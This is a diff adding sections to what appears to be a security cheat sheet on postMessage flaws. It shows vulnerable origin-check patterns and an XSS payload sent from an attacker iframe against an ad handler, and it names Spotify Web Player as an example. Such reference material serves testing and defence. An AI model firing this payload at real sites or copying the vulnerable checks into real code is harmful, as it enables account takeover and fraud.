@@ -52,6 +52,37 @@ if (e.origin.search('trusted.site.com') !== -1) { eval(e.data); }
 Bypass: trustedXsite.com matches (. = any char in regex)
 ```
 
+## Short-circuiting Origin Check
+Developers sometimes allow cross-origin communication for specific debug or ad-iframe features, inadvertently creating a logic bypass.
+
+**Vulnerable Pattern:**
+```javascript
+if (!this.enableCrossOriginIframe || this.isAllowedOrigin(e.origin)) {
+  // If enableCrossOriginIframe is false, the origin check is skipped entirely!
+  this.handleMessage(e.data);
+}
+```
+
+## Insecure HPTO PostMessage Hijacking
+A specific variant of PostMessage vulnerability found in high-traffic ad-heavy sites (e.g., Spotify Web Player).
+
+**Pattern:** `addEventListener("message", ...)` in the ad handling logic (e.g., `fetchCreative`) lacks origin validation for specific message types like `ads:hpto:init`.
+
+**Payload:**
+```javascript
+// From an attacker iframe:
+targetWindow.postMessage({ 
+  "type": "ads:hpto:init", 
+  "data": { 
+    "data": { 
+      "playBtnUri": "javascript:alert(document.domain)" 
+    } 
+  } 
+}, '*');
+```
+
+**Impact:** One-click XSS leading to full Account Takeover or Ad Fraud (logging fake views).
+
 ## Null Origin via Sandboxed Iframe
 ```html
 <iframe sandbox="allow-scripts allow-popups" srcdoc="
